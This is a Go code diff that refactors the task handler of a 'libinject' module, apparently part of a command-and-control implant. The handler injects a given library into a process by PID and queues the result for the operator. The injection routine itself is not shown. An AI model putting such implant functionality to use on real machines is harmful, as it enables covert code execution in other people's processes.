@@ -3,10 +3,13 @@ package libinject
 import (
 	"encoding/json"
 	"fmt"
-	"log"
 
 	"pkg/utils/structs"
+	"sync"
+	"pkg/profiles"
 )
+
+var mu sync.Mutex
 
 // Inject C source taken from: http://www.newosxbook.com/src.jl?tree=listings&file=inject.c
 type Injection interface {
@@ -21,42 +24,49 @@ type Arguments struct {
 	LibraryPath string `json:"library"`
 }
 
-func Run(task structs.Task, threadChannel chan<- structs.ThreadMsg) {
-	tMsg := structs.ThreadMsg{}
-	tMsg.TaskItem = task
+func Run(task structs.Task) {
+	msg := structs.Response{}
+	msg.TaskID = task.TaskID
 
 	args := Arguments{}
 	err := json.Unmarshal([]byte(task.Params), &args)
 
 	if err != nil {
-		tMsg.Error = true
-		tMsg.TaskResult = []byte(err.Error())
-		threadChannel <- tMsg
-		return
-	}
+		msg.UserOutput = err.Error()
+		msg.Completed = true
+		msg.Status = "error"
 
-	if err != nil {
-		tMsg.Error = true
-		tMsg.TaskResult = []byte(err.Error())
-		threadChannel <- tMsg
+		resp, _ := json.Marshal(msg)
+		mu.Lock()
+		profiles.TaskResponses = append(profiles.TaskResponses, resp)
+		mu.Unlock()
 		return
 	}
 
 	result, err := injectLibrary(args.PID, args.LibraryPath)
 
 	if err != nil {
-		log.Println("Failed to inject shellcode:", err.Error())
-		tMsg.Error = true
-		tMsg.TaskResult = []byte(err.Error())
-		threadChannel <- tMsg
+		msg.UserOutput = err.Error()
+		msg.Completed = true
+		msg.Status = "error"
+
+		resp, _ := json.Marshal(msg)
+		mu.Lock()
+		profiles.TaskResponses = append(profiles.TaskResponses, resp)
+		mu.Unlock()
 		return
 	}
 
 	if result.Success() {
-		tMsg.TaskResult = []byte(fmt.Sprintf("Successfully injected %s injection into pid: %d ", args.LibraryPath, args.PID))
+		msg.UserOutput = fmt.Sprintf("Successfully injected %s injection into pid: %d ", args.LibraryPath, args.PID)
 	} else {
-		tMsg.TaskResult = []byte(fmt.Sprintf("Failed to inject %s into pid: %d ", args.LibraryPath, args.PID))
+		msg.UserOutput = fmt.Sprintf("Failed to inject %s into pid: %d ", args.LibraryPath, args.PID)
 	}
 
-	threadChannel <- tMsg
+	msg.Completed = true
+	resp, _ := json.Marshal(msg)
+	mu.Lock()
+	profiles.TaskResponses = append(profiles.TaskResponses, resp)
+	mu.Unlock()
+	return
 }
